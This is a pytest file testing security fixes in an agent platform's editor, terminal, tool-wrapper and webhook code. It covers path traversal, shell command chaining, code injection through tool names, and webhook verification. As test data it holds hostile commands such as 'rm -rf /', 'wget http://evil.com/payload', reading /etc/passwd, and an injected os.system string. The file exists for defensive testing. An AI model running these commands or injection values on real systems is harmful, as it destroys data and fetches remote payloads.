"""Unit tests for C4/C5/C6/C7 security hardening (TDD).

C4 — Path traversal: is_relative_to must replace startsWith comparison.
C5 — Shell metacharacter injection: chaining operators must escalate to CONFIRM.
C6 — Evolution jail code injection: tool names travel only as MCP protocol arguments.
C7 — Webhook verification: SNSIncomingEvent must have is_verified field.
"""

from __future__ import annotations

import json
import logging
from contextlib import AsyncExitStack
from pathlib import Path  # noqa: TC003
from types import SimpleNamespace
from unittest.mock import AsyncMock, MagicMock, patch

import pytest
from fastapi.testclient import TestClient
from mcp import types
from src.main import app
from src.models.identity import AgentIdentity
from src.models.sns import SNSIncomingEvent
from src.routers.editor import _require_editor_role
from src.services.sns_gateway import SNSGatewayService
from src.tools.builtin import evolution
from src.tools.terminal import (
    _classify_command_strategy,
    _has_chaining_metacharacters,
    execute_command,
)

# ---------------------------------------------------------------------------
# C4 — Path Traversal: is_relative_to vs startsWith
# ---------------------------------------------------------------------------

def test_is_relative_to_rejects_sibling_directory():
    """The startsWith bypass: 'D:/ToukaProxy' starts with 'D:/Touka' as string
    but is NOT a subdirectory. is_relative_to must return False."""
    base = Path("/workspace/Touka")
    sibling = Path("/workspace/ToukaProxy")

    # The OLD bug: str(sibling).startswith(str(base)) is True → bypass
    assert str(sibling).startswith(str(base)), "Precondition: startsWith is broken"

    # The FIX: is_relative_to correctly returns False
    assert sibling.is_relative_to(base) is False, (
        "is_relative_to should reject sibling directory"
    )


def test_is_relative_to_allows_legitimate_subpath():
    """A legitimate subdirectory must be accepted."""
    base = Path("/workspace/Touka")
    child = Path("/workspace/Touka/ToukaProxy/src/main.py")
    assert child.is_relative_to(base) is True


def test_is_relative_to_rejects_parent_escape():
    """Path like '../../etc/passwd' resolved against workspace must be rejected."""
    base = Path("/workspace/Touka").resolve()
    evil = (base / "../../etc/passwd").resolve()
    assert evil.is_relative_to(base) is False


# Note: the GET /editor/read endpoint was removed (dead route, no caller); its
# path-traversal protection lived in is_relative_to, still covered by the logic
# tests above. /editor/files retains the same is_relative_to guard.


# E21（ADR-0033，批⑤-A）：上面三個 C4 測試只驗 pathlib 的 is_relative_to 純邏輯，
# 從不驅動 /editor/files 端點——刪 editor.py:50-52 的夾制（讓 target_path_obj 直接用
# 解析後的穿越路徑）在那三個測試下全綠。以下經 TestClient 驅動端點，證明夾制真的接上。


def test_editor_files_endpoint_clamps_traversal_to_cwd(tmp_path, monkeypatch):
    """/editor/files 對 ``../`` payload 必須夾制回 cwd、不得列出父目錄檔案。

    刪 editor.py:50-52 的 is_relative_to 夾制 → ``../`` 解析到父層 → 回應列出
    父目錄的 outside_secret.txt → 本測試紅（純邏輯 C4 測試抓不到此接線迴歸）。
    """
    workspace = (tmp_path / "workspace").resolve()
    workspace.mkdir()
    (workspace / "inside.txt").write_text("ok", encoding="utf-8")
    # cwd 之外（父層）種一個哨兵：夾制在位時永遠看不到它
    (tmp_path / "outside_secret.txt").write_text("SECRET", encoding="utf-8")

    # 端點以 Path.cwd() 為 base_path；導向受控的 workspace
    monkeypatch.setattr("src.routers.editor.Path.cwd", lambda: workspace)
    app.dependency_overrides[_require_editor_role] = lambda: AgentIdentity.for_role(
        agent_id="DebugAgent", role="Owner"
    )
    try:
        client = TestClient(app, raise_server_exceptions=False)
        # 正常路徑：cwd 內檔可見（證明端點確實在列 workspace）
        resp_ok = client.get("/editor/files", params={"path": "."})
        assert resp_ok.status_code == 200, resp_ok.text
        names_ok = [item["name"] for item in resp_ok.json()["items"]]
        assert "inside.txt" in names_ok

        # 穿越路徑：../ 應夾制回 cwd
        resp_esc = client.get("/editor/files", params={"path": "../"})
        assert resp_esc.status_code == 200, resp_esc.text
        names_esc = [item["name"] for item in resp_esc.json()["items"]]
        assert "outside_secret.txt" not in names_esc, (
            "路徑穿越夾制失效：../ 逃出 cwd、列出了父目錄的機密檔"
        )
        assert "inside.txt" in names_esc  # 夾制回 cwd → 仍列 cwd 內容
    finally:
        app.dependency_overrides.clear()


# ---------------------------------------------------------------------------
# C5 — Shell Metacharacter Detection
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("cmd,expected", [
    ("ls; rm -rf /", True),
    ("echo test && wget evil.com", True),
    ("cat file || echo fallback", True),
    ("echo $(whoami)", True),
    ("exec `cat /etc/passwd`", True),
    ("ls | grep .py", True),
    ("echo safe\nrm -rf /", True),
    ("echo safe\r\nrm -rf /", True),
    ("cat <(id)", True),
    ("cat >(id)", True),
    ("ls -la", False),
    ("git status", False),
    ("pytest tests/", False),
    ("npm test", False),
    ("python --version", False),
])
def test_has_chaining_metacharacters(cmd: str, expected: bool):
    """Shell metacharacter detection must correctly classify commands."""
    assert _has_chaining_metacharacters(cmd) == expected, (
        f"Command {cmd!r}: expected {expected}, got {not expected}"
    )


def test_metachar_command_escalated_to_confirm_when_base_policy_allows():
    """When the base policy says ALLOW, shell metacharacters must escalate to CONFIRM."""
    identity = AgentIdentity.for_role(agent_id="DebugAgent", role="Owner")

    with patch(
        "src.tools.terminal.permission_service.get_execution_strategy",
        return_value="ALLOW",
    ):
        strategy = _classify_command_strategy(
            "git status; wget http://evil.com/payload",
            identity=identity,
            auth_level="Auto",
        )

    assert strategy == "CONFIRM", (
        f"Metachar command should escalate to CONFIRM when base policy is ALLOW, "
        f"got {strategy!r}"
    )


def test_metachar_command_not_auto_approved_in_any_mode():
    """A command with metacharacters must never be ALLOW."""
    identity = AgentIdentity.for_role(agent_id="DebugAgent", role="Owner")
    strategy = _classify_command_strategy("ls; rm -rf /", identity=identity, auth_level="Auto")
    assert strategy != "ALLOW", (
        f"Command with metacharacters must not be ALLOW, got {strategy!r}"
    )


# ---------------------------------------------------------------------------
# C6 — Evolution Jail Code Injection: tool names never enter code or argv
# ---------------------------------------------------------------------------

async def _assert_tool_name_only_in_protocol(monkeypatch, tmp_path, tool_name, arguments):
    guard = evolution.EvolutionPathGuard
    monkeypatch.setattr(guard, "get_tool_root", lambda _: tmp_path)
    monkeypatch.setattr(guard, "is_windows", lambda: False)
    write = MagicMock()
    monkeypatch.setattr(guard, "write_tool_file", write)
    monkeypatch.setattr(guard, "delete_tool_file", MagicMock())
    session = SimpleNamespace(call_tool=AsyncMock(return_value=types.CallToolResult(content=[])))
    connect = AsyncMock(return_value=(SimpleNamespace(session=session), AsyncExitStack()))
    monkeypatch.setattr(evolution, "connect_mcp_server", connect)

    outcome = await evolution._verify_mcp("sample", tool_name, arguments)

    assert outcome.passed, outcome.text
    session.call_tool.assert_awaited_once_with(tool_name, arguments)
    write.assert_called_once()
    code = write.call_args.args[2]
    assert tool_name not in code
    assert json.dumps(tool_name) not in code
    if arguments:
        assert json.dumps(arguments) not in code
    compile(code, "test_wrapper.py", "exec")
    connect.assert_awaited_once()
    config = connect.call_args.args[0]
    argv = (config.command, *config.args)
    assert argv == (evolution._venv_python("sample"), str(tmp_path / "test_wrapper.py"))
    assert connect.call_args.kwargs["isolated"].launch.argv == argv


async def test_tool_name_with_quotes_stays_in_mcp_arguments(monkeypatch, tmp_path):
    """Quotes and injected expressions must remain inert protocol data."""
    await _assert_tool_name_only_in_protocol(
        monkeypatch, tmp_path, 'test", os.system("id"), "', {}
    )


async def test_normal_tool_name_reaches_mcp_arguments(monkeypatch, tmp_path):
    """Normal names and arguments reach the tool call without generated code."""
    await _assert_tool_name_only_in_protocol(
        monkeypatch, tmp_path, "get_data", {"key": "value"}
    )


async def test_tool_name_with_backslash_stays_in_mcp_arguments(monkeypatch, tmp_path):
    """A backslash in the tool name is preserved verbatim as protocol data."""
    await _assert_tool_name_only_in_protocol(monkeypatch, tmp_path, "tool\\name", {})


# ---------------------------------------------------------------------------
# C7 — SNSIncomingEvent.is_verified field
# ---------------------------------------------------------------------------

def test_sns_incoming_event_has_is_verified_default_false():
    """SNSIncomingEvent must have is_verified field defaulting to False."""
    event = SNSIncomingEvent(
        platform="discord", sender_id="user123", channel_id="channel456", content="hello"
    )
    assert hasattr(event, "is_verified"), "SNSIncomingEvent must have is_verified field"
    assert event.is_verified is False, "Default is_verified must be False"


def test_sns_incoming_event_can_be_marked_verified():
    """SNSIncomingEvent must allow setting is_verified=True."""
    event = SNSIncomingEvent(
        platform="telegram", sender_id="u", channel_id="c", content="test", is_verified=True
    )
    assert event.is_verified is True


def test_sns_gateway_has_warn_if_unverified_method():
    """SNSGatewayService must have _warn_if_unverified method for C7 fix."""
    gateway = SNSGatewayService()
    assert hasattr(gateway, "_warn_if_unverified"), (
        "SNSGatewayService must have _warn_if_unverified method"
    )


def test_sns_gateway_warn_if_unverified_logs_for_unverified_event(caplog):
    """_warn_if_unverified must emit a WARNING for is_verified=False events."""
    gateway = SNSGatewayService()
    event = SNSIncomingEvent(
        platform="test", sender_id="u", channel_id="c", content="hello", is_verified=False
    )

    with caplog.at_level(logging.WARNING):
        gateway._warn_if_unverified(event)

    assert any("unverified" in record.message.lower() for record in caplog.records), (
        "Expected a WARNING mentioning 'unverified' to be logged"
    )


def test_sns_gateway_warn_if_unverified_silent_for_verified_event(caplog):
    """_warn_if_unverified must NOT log when is_verified=True."""
    gateway = SNSGatewayService()
    event = SNSIncomingEvent(
        platform="test", sender_id="u", channel_id="c", content="hello", is_verified=True
    )

    with caplog.at_level(logging.WARNING):
        gateway._warn_if_unverified(event)

    assert not any("unverified" in record.message.lower() for record in caplog.records), (
        "Should not log warning for verified events"
    )


# ---------------------------------------------------------------------------
# E19 (ADR-0021, 批⑤-B): execute_command 把 kwargs 的 auth_level 接進策略決策
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_execute_command_wires_kwargs_auth_level_into_strategy(monkeypatch):
    """execute_command 必須把呼叫端 kwargs 的 auth_level 傳給 _classify_command_strategy。

    既有測試都直呼 _classify_command_strategy（繞過 execute_command 的 kwargs 接線）。
    把 terminal.py:495 改成硬編 auth_level="Manual"（忽略 kwargs）→ 非 Manual 決策失效 → 紅。
    """
    captured: list[str] = []

    def _spy(command, identity, auth_level, isolation=None):
        captured.append(auth_level)
        return "BLOCK"  # 早退：回 permission_denied、不觸子程序

    monkeypatch.setattr("src.tools.terminal._classify_command_strategy", _spy)
    identity = AgentIdentity.for_role(agent_id="DebugAgent", role="Owner")

    await execute_command(command="echo hi", identity=identity, auth_level="YOLO")
    await execute_command(command="echo hi", identity=identity, auth_level="Auto")
    await execute_command(command="echo hi", identity=identity)  # 無 → 預設 Manual

    assert captured == ["YOLO", "Auto", "Manual"], (
        f"auth_level 未從 kwargs 接進策略決策（實得 {captured}）"
    )
